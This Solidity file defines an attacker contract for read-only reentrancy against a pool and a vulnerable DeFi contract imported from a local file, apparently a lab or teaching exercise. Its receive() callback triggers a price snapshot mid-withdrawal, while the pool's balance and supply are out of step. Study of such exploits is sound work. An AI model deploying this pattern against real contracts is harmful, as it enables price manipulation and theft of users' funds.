// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;


import {VulnerableDeFiContract, ReadOnlyPool} from "../ReadOnly.sol";

contract ReadOnlyAttacker{
    VulnerableDeFiContract vulnerableContract;
    ReadOnlyPool readOnlyPool;

    constructor(address _vulnerableContract, address _readOnly){
        vulnerableContract = VulnerableDeFiContract(_vulnerableContract);
        readOnlyPool = ReadOnlyPool(_readOnly);
    }
    function attack() public payable{
        readOnlyPool.addLiquidity{value: msg.value}(); //pool balance = 102, totalSupply = 101
        readOnlyPool.removeLiquidity(); // pool balance = 101, totalSupply = 100
    }

    receive() external payable{
        vulnerableContract.snapshotPrice();
    }
}